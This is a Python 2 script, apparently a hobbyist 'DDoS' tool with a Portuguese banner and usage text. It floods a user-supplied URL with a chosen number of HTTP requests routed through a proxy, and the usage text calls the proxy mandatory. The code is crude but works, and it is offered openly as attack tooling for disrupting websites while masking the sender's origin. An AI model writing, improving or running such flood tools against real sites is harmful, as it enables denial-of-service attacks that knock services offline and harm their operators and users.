# BAGUNCINHA - DDOS
# Desenvolvido por Rafael Cintra Lopes
# Site: http://rafaelcintralopes.com.br  |  Email: rafaelcintralopes@gmail.com

import sys
import urllib2
import getopt
from time import sleep

welcome = """
                                                           .//:----..........-..---/:`             
                                                         .//-..------...--..----...-:/:            
                                                       `o/--.--:/o+/:------------...--::-          
                                                      -/:---:/+syyo//:::://::::::---...-/:`        
                                                     :+---/+++oysooooo+++oo++oo++/:--.---::        
                                                    `+---/+oo++oooooossooosssyyyyys+:--.--/`       
                                                    //--:+oo++++++ossssssssyyhhhhhyyo:-----`       
                                                    s+-:/oo++++++oosssssyyyyhhdhhhhhs+:---:.       
                                                    ++-:+oo++++ooooossssssssyyyyyhhhyo/:--/.       
                                                    oy:/ooo++++++oossssssyyyyyyyyyhhhs+/--/`       
                                                   `hs:oso/:--:::/+ssssyssssssssyhhhhyo:::/        
                                                   /h+-++/:::::::://+osso+//:/+oosyhhyo:-:/-       
                                                   :d/:++/:----:::/:/+oooo//:+yyyyhhso/::osy.      
                                                   .o++o+++/::::::::/ossoso++syysyhhhho/ydys.      
                                                   `ooss++osoo+///++ossyyssooooosyhhhhyoydyo`      
                                                    +ysyo++ooo+//+ossyyyyyysssosyhhddhhyohy.       
                                                    /yssooso/::::/+shhdhhhhysosyhdddddhyys-        
                                                    :yso+oo:-------+ssoooossssoshdddddhhh`         
                                                    :ys++s/:::////++ooooossssoo+sddddhhd+          
                                                    .ss++oo//::/++syyhddddhssysosddddds:           
                                                    `oo+/+o+/::/+oydhdddhyysyhhshdddd:             
                                            `.:/::` `+++////////++oosssyyhhdddhdddmh:              
                                         `-:/++::::-/oo+///////++ossyhhdddddddddddy.               
                                    ``./////::/o+::/+++/////////++ossyhhdddddddddd-                
                               ``:/+ooo+///////oyo/o+o///:::::://+osyyyhhhhhhhddds                 
                         ``.-:+yssssoos++sssssssydoo+/::/:://////+ssssyyyyyyhdddh-                 
                     ``:++oso++oyyysso+o+/+osssssydoo/:::///++oooosssssyyhhddddd/                  
                   ./++o++++//+oshdhyhyoso+//+ooooyh++//:://+ossyyyyyhhddmmdddhs/-`                
                 -//:----/+oooooosyyysyyoos+++:/oo+os/+////++osyhhhhhhhdmmmmddy:-://-.`            
              `.///////::-:oyyyyyyhmmmdmhohyss+/:::/ss/++/+++oyhhddddhddmmmdddy:.--::::-.`         
            `:/oosssssso+/:/yhhhhhhmNNNNNyymysyyo::::oo:o++oossshdmmmddmmmmddhy+-.-::::::/:.`      
          `-ssssssssssssoo/:+hhhhhhdNMMNMhsmdyyyyo++//+//o++os+/sdmmmmmmmmmdddyo:..-::--.-////-`   
         .syssssssyyyyyssoo/:shhyyhymNNNNhsymhsshhyho/ooydhyssso/ydddddmmmmdddyo/..--::-.-/:/sho`  
        -sysssssyyyyyyyysso+::/+/://+hdddy++yo+/+syhdo++ohhdhsyyo+ddddddddddhhyso-.---::--/:+yoo:` 
       +yssssssyyyhhhhhyyss+::://::::ydhhy+/s::--://os//+smhmhmmy+sdddhhhhhhhhyoy/.-----:::/syyoos-
     .+yssssssyyyhhhhhhhhys+/:://::::oddhh+:so:--::::o+//:sdhddNds/yddddddhhhhhsho----:--::+yhhhoyh
   -+yysssssyyyhhhdddddhhyso/:://::::/hdhdo/oy/:--:::/s+o:-/oooshs+/hddddddddddshs-.--:----:+++osoy
`:oyssssssyyyhhhdddddddhhys+/::/+///::sddds/+ho:--::::ssoo:.-/+osys++hhhhhhdddhsho..-------:so-/d+d
  ____                _____   _    _   _   _    _____   _____   _   _   _    _                _____    _____     ____     _____ 
 |  _ \      /\      / ____| | |  | | | \ | |  / ____| |_   _| | \ | | | |  | |     /\       |  __ \  |  __ \   / __ \   / ____|
 | |_) |    /  \    | |  __  | |  | | |  \| | | |        | |   |  \| | | |__| |    /  \      | |  | | | |  | | | |  | | | (___  
 |  _ <    / /\ \   | | |_ | | |  | | | . ` | | |        | |   | . ` | |  __  |   / /\ \     | |  | | | |  | | | |  | |  \___ \ 
 | |_) |  / ____ \  | |__| | | |__| | | |\  | | |____   _| |_  | |\  | | |  | |  / ____ \    | |__| | | |__| | | |__| |  ____) |
 |____/  /_/    \_\  \_____|  \____/  |_| \_|  \_____| |_____| |_| \_| |_|  |_| /_/    \_\   |_____/  |_____/   \____/  |_____/
\n

> Desenvolvido por Rafael Cintra Lopes
> Site: http://rafaelcintralopes.com.br  |  Email: rafaelcintralopes@gmail.com

Modo de usar: 
    -u URL
    -q QUANTIDADE DE PACOTES A SEREM ENVIADOS
    -p PROXY

Exemplo: python baguncinha-ddos.py -u http://site.com -q 5 -p 18.196.25.75:80

*Caso demorar para iniciar, mude o proxy
*Obrigatorio o uso de proxy
-----------------------------------------------------------------------------------------------------------------------------------
\n
"""

for char in welcome:
    sleep(0.0001)
    sys.stdout.write(char)
    sys.stdout.flush()

optlist, args = getopt.getopt(sys.argv[1:], 'u:q:p:')
for (opcao,argumento) in optlist:
    if opcao == '-u':
        url = argumento
    elif opcao == '-q':
        qtd = int(argumento)
    elif opcao == '-p':
        proxyin = argumento

proxy_support = urllib2.ProxyHandler({"http":proxyin})
opener = urllib2.build_opener(proxy_support)
urllib2.install_opener(opener)

req = urllib2.Request(url)
site = urllib2.urlopen(req)

print site.info()

try:
    for x in range(qtd):
        site = urllib2.urlopen(req)
        print len(site.read()), 'kbytes enviados'
except urllib2.HTTPError as e:
    print "Erro:", e.code